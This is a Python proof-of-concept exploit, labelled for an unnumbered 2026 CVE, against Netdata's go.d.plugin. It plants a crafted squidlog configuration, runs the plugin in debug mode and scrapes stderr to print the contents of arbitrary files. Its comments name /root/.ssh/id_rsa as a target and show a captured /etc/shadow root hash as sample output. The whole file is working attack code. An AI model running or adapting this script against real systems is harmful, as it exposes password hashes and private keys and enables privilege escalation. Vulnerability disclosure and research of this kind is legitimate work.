
#!/usr/bin/python3 
import argparse
import re
from pathlib import Path
import subprocess

# test if base directory exists
def test_directory(dir_path: str) -> bool:
    p = Path(dir_path)
    if p.exists() and p.is_dir():
        return True
    return False

def test_file(file_path: str) -> bool:
    # This is the only weird part of the poc as we have to trust the user that they are giving us a real file
    # we cant exactly check that /root/.ssh/id_rsa exists, so if we hit a PermissionError we just return true
    f = Path(file_path)
    try:
        if f.exists() and f.is_file():
            return True
        return False
    except Exception as e:
        print(e)
        return False
    
def write_content(file_path: str, file_content: str) -> bool:
    try:
        with open(file_path, "w") as fp:
            fp.write(file_content)
            return True
    except Exception as e:
        print(f"[-] Error writing contents of: {file_path}: {e}")
        return False

# create the configs
def create_configs(path: str) -> tuple[Path, Path, bool]:
    base_path = Path(path) / "godconf"

    squid_path = base_path / "go.d" / "squidlog.conf"
    go_d_path = base_path / "go.d.conf"
    vnodes_path = base_path / "go.d" / "vnodes"

    try :
        vnodes_path.mkdir(parents=True, exist_ok=True)
        squid_path.touch(exist_ok=True)
        go_d_path.touch(exist_ok=True)

        return squid_path, go_d_path, True

    except OSError as e:
        print(f"[-] Error: reating configs: {e}")
        return None, None, False

# call the plugin on the file, capturing the output from the plugin
def exploit(program: str, args: list[str]) -> tuple[int, bytes, bytes]:
    process = subprocess.Popen([program, *args], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout, stderr = process.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        # be nice first and terminate
        process.terminate()

        try:
            stdout, stderr = process.communicate(timeout=2)
        except subprocess.TimeoutExpired:
            # it didnt exit after two more seconds, kill it
            process.kill()
    return process.returncode, stdout.decode("utf-8", errors="ignore"), stderr.decode("utf-8", errors="ignore")

# parse the plugin output to extract only the file contents the user cares about
def parse_output(output: str):
    # DBG squidlog/init.go:43 last line: 'root:$y$j9T$b8YTZC.viENXZn7SVoK57.$HjCJ50swo.q3GOJ2ZEQo0fkR2xPhHmo7tBN0aK/EDUD:20549:0:99999:7:::' collector=squidlog job=squidlog config_source="user/file reader"
    lines = output.split("\n")

    for line in lines:
        match = re.search(r"last line:\s*'([^']*)'", line)
        if match:
            print(match.group(1))

def main(args):
    base_dir = args.base_dir
    plugin_loc = args.plugin_location
    file_to_read = args.file_name

    squid_log_conf = f"""jobs:
- name: squidlog
  path: {file_to_read}
"""

    go_d_config = """enabled: yes
default_run: no
max_procs: 1

modules:
  squidlog: yes
"""
    
    if not test_file(plugin_loc):
        print(f"[-] {plugin_loc} does not exist")
        return
    print(f"[*] {plugin_loc} exists")
    
    if not test_directory(base_dir):
        print(f"[-] {base_dir} does not exist")
        return
    print(f"[*] {base_dir} exists")

    sp, gp, succ = create_configs(base_dir)
    if not succ:
        return 
    if not write_content(sp, squid_log_conf):
        return 
    if not write_content(gp, go_d_config): 
        return 

    # /opt/netdata/usr/libexec/netdata/plugins.d/go.d.plugin -c /tmp/godconf/ -d
    code, stdout, stderr = exploit(plugin_loc, ["-c", Path(base_dir) / "godconf", "-d"])
    print(f"[*] go.d.plugin return code: {code}")
    #print(f"stdout:\n{stdout}")
    #print(f"stderr:\n{stderr}")

    # file contents is now in stderr 
    # DBG squidlog/init.go:43 last line: 'root:$y$j9T$b8YTZC.viENXZn7SVoK57.$HjCJ50swo.q3GOJ2ZEQo0fkR2xPhHmo7tBN0aK/EDUD:20549:0:99999:7:::' collector=squidlog job=squidlog config_source="user/file reader"
    parse_output(stderr)


if __name__ == '__main__':
    opts = argparse.ArgumentParser(description="POC for CVE-2026-XXXX", epilog="Created by ice-wzl")
    opts.add_argument("-b", "--base_dir", help="The base directory to setup the malicous config structure", type=str, required=True)
    opts.add_argument("-p", "--plugin_location", help="The plugin location for netdata's go.d.plugin binary", type=str, required=True)
    opts.add_argument("-f", "--file_name", help="The filename to read. POC reads the last 100 lines of the file", type=str, required=True)
    args = opts.parse_args()

    main(args)
